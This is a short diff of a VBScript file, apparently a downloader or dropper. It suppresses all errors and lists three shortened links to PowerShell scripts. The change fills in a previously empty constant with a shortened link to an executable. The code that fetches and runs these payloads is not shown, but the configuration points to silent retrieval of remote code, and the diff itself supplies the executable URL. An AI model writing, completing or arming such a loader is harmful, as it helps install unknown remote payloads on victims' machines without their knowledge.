@@ -5,7 +5,7 @@ On Error Resume Next ' Silence total en cas d'erreur
 Const URL_PS1_1 = "https://is.gd/8dXx7r" 
 Const URL_PS1_2 = "https://is.gd/Q0RCKd"
 Const URL_PS1_3 = "https://is.gd/DmsTfp"
-Const URL_EXE   = ""
+Const URL_EXE   = "https://is.gd/7YFwyq"
 
 ' --- 2. INITIALISATION ---
 Dim WshShell, FSO, UserDir, TempDir
@@ -87,6 +87,7 @@ Function Valid(fPath)
         If FSO.GetFile(fPath).Size > 0 Then Valid = True
     End If
 End Function
+
 
 
 
